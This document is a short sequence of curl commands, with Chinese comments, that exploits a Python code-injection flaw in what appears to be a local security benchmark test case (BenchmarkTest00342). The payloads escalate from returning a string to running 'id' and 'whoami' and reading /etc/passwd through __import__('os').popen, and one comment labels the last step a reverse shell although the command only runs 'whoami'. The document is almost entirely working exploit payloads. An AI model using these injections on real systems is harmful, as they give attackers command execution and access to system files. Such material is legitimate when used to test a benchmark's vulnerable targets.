# 1. 基础验证 - 返回字符串 'pwned'
curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
  -d 'BenchmarkTest00342="pwned"'

# 2. 命令执行 - 运行 id
curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
  -d 'BenchmarkTest00342=__import__("os").popen("id").read()'

# 3. 文件读取 - 读 /etc/passwd
curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
  -d 'BenchmarkTest00342=__import__("os").popen("cat /etc/passwd").read()'

# 4. 反向 shell 或任意命令
curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
  -d 'BenchmarkTest00342=__import__("os").popen("whoami").read()'